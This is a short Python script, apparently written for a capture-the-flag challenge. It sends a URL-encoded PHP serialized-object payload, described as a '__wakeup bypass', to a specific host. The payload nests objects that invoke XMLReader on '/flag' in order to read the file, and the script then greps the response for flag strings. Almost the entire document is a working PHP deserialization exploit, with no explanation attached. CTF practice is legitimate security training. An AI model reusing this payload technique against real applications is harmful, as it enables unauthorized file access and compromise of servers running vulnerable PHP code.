import requests

bypass_url = "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A3%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A3%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22XMLReader%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A1%3A%22c%22%3BN%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"

print("="*70)
print("Testing payload with __wakeup bypass")
print("="*70)

response = requests.get(bypass_url, timeout=15)
print(f"Status: {response.status_code}")
print(f"Length: {len(response.text)}")
print("\nResponse:")
print(response.text)

# 搜索flag
import re
flags = re.findall(r'(flag\{[^}]+\}|FLAG\{[^}]+\}|ctf\{[^}]+\}|CTF\{[^}]+\})', response.text, re.IGNORECASE)
if flags:
    print("\n" + "!"*70)
    print("FLAGS FOUND:")
    for flag in flags:
        print(f"  {flag}")
    print("!"*70)
